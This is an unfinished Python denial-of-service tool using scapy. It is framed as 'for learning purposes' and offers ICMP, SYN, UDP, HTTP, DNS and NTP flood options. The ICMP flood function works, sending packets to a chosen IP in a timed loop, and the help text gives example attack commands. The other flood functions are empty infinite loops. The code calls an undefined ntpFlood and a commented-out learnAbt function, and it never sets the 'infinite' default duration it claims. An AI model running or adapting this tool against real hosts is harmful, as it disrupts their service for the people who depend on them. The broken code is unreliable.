from scapy.all import *
import sys
import time



# PROJECT INTRO 

print("\n\nSimple DoS tool for learning purposes")
print("Made By Erectsec\n\n")



# Arguments

for i in range(1,len(sys.argv)):

    if sys.argv[i] == "--ip":
        ip = sys.argv[i+1]
    
    elif sys.argv[i] == "-d":

        duration = sys.argv[i+1]


def main():

    print("")
    # packet




# def learnAbt(subject):


#     if subject == "ICMP":

#         print("An ICMP Flood is when you send a large number of ICMP echo requests to a target IP")
#     elif subject == "SYN":
#         print(" A ")
#     elif subject == "UDP":
#     elif subject == "HTTP":
#     elif subject == "DNS":
#     elif subject == "NTP":





def helpMsg():

    helpString = """

--------------------------
FLOOD ATTACKS
--------------------------
[1] ICMP Flood | --icmp
[2] SYN Flood | --syn
[3] UDP Flood | --udp
[4] HTTP Flood | --http
[5] DNS Flood | --dns
[6] NTP Flood | --ntp


--------------------------
OTHER METHODS
--------------------------


NOT FINISHED 

PING FLOOD |
Land Attack 
Smurf Attack
Fragment Attack


--------------------------
PARAMETERS
--------------------------

Set Duration : -d [time] (DEFAULT IS INFINITE) | This is time in seconds
Set IP : --ip [IP ADDRESS] ( NECCESSARY)



--------------------------
EXAMPLES
--------------------------

Example : python3 main.py --icmp --ip 192.168.1.1 -d 20 | Runs a ICMP Flood agains the IP for 20 seconds
Example : python3 main.py --http --ip 192.168.1.1  | Runs a HTTP Flood against this IP for infinite amounts of time

    """

    print(helpString)
    
    learnMore = input("Enter Number : ")

    if int(learnMore) == 1:
        learnAbt("ICMP")

    elif int(learnMore) == 2:
        learnAbt("SYN")

    elif int(learnMore) == 3:
        learnAbt("UDP")

    elif int(learnMore) == 4:
        learnAbt("HTTP")

    elif int(learnMore) == 5:
        learnAbt("DNS")

    elif int(learnMore) == 6:
        learnAbt("NTP")



def icmpFlood(ip,hitTime):

    attacking = True
    # ip = string(ip)
    hitTime = int(hitTime)
    initialTime = time.time()
    while attacking:
        packet = IP(dst=ip) / ICMP()
        send(packet,verbose=0)
        if time.time() - initialTime > hitTime:
            break


def synFlood(ip,hitTime):

    attacking = True
    hitTime = int(hitTime)
    initialTime = time.time()
    while attacking:
        pass

def udpFlood(ip,hitTime):

    attacking = True
    hitTime = int(hitTime)
    initialTime = time.time()
    while attacking:
        pass

def httpFlood(ip,hitTime):

    attacking = True
    hitTime = int(hitTime)
    initialTime = time.time()
    while attacking:
        pass

def dnsFlood(ip,hitTime):

    attacking = True
    hitTime = int(hitTime)
    initialTime = time.time()
    while attacking:
        pass


# PARAMETERS FOR PROTOCOL/METHOD

for i in range(1,len(sys.argv)):


    if sys.argv[1] == "--help" or sys.argv[1] == "-h":
        helpMsg()

    elif sys.argv[i] == "--icmp":
        icmpFlood(ip,duration)
    
    elif sys.argv[i] == "--syn":
        synFlood(ip,duration)

    elif sys.argv[i] == "--udp":
        udpFlood(ip,duration)
    
    elif sys.argv[i] == "--http":
        httpFlood(ip,duration)

    elif sys.argv[i] == "--dns":
        dnsFlood(ip,duration)

    elif sys.argv[i] == "--ntp":
        ntpFlood(ip,duration)
    
